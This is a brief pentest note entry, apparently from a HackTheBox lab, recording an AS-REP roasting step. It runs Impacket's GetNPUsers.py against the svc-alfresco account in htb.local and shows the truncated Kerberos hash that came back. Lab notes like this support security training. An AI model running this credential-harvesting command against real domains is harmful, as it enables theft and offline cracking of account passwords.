---
id: 59b66d80-8955-4783-8e7c-3c3e760d2f62
name: Get TGT for svc-alfresco
type: command
executor: bash
data: '$ python GetNPUsers.py htb.local/svc-alfresco -no-pass

  $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4

  '
output: null
created_at: '2023-04-06T03:56:04.983374+00:00'
updated_at: '2023-04-10T20:26:39.227036+00:00'
---

# Get TGT for svc-alfresco

```bash
$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4

```
